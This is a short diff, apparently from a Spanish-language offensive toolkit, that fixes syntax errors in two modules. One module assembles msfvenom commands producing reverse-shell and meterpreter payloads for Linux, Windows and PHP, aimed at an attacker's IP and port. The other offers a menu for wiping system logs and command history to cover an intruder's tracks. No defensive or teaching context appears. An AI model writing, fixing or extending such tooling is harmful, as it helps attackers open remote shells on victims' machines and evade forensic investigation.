@@ -1364,15 +1364,15 @@ tarea modulo_payloads_generar:
     
     si tipo_payload == "linux":
         payload_info = "linux/x86/shell_reverse_tcp"
-        info("msfvenom -p " + payload_info + " LHOST=" + ip_atacante + " LPORT=" + puerto + " -f elf > payload.elf"
+        info("msfvenom -p " + payload_info + " LHOST=" + ip_atacante + " LPORT=" + puerto + " -f elf > payload.elf")
     
     osi tipo_payload == "windows":
         payload_info = "windows/meterpreter/reverse_tcp"
-        info("msfvenom -p " + payload_info + " LHOST=" + ip_atacante + " LPORT=" + puerto + " -f exe > payload.exe"
+        info("msfvenom -p " + payload_info + " LHOST=" + ip_atacante + " LPORT=" + puerto + " -f exe > payload.exe")
     
     osi tipo_payload == "php":
         payload_info = "php/meterpreter/reverse_tcp"
-        info("msfvenom -p " + payload_info + " LHOST=" + ip_atacante + " LPORT=" + puerto + " -f raw > shell.php"
+        info("msfvenom -p " + payload_info + " LHOST=" + ip_atacante + " LPORT=" + puerto + " -f raw > shell.php")
     
     exito("Payload configurado para " + ip_atacante + ":" + puerto)
 
@@ -1382,9 +1382,9 @@ tarea modulo_payloads_generar:
 
 tarea modulo_limpieza_ejecutar:
     opciones_clean = [
-        {"label": "Limpiar logs del sistema", "cmd": "logs"}
-        {"label": "Limpiar historial de comandos", "cmd": "history"}
-        {"label": "Limpieza completa (todo)", "cmd": "full"}
+        {"label": "Limpiar logs del sistema", "cmd": "logs"},
+        {"label": "Limpiar historial de comandos", "cmd": "history"},
+        {"label": "Limpieza completa (todo)", "cmd": "full"},
     ]
     
     modo = menu_interactivo("LIMPIEZA DE HUELLAS", opciones_clean)
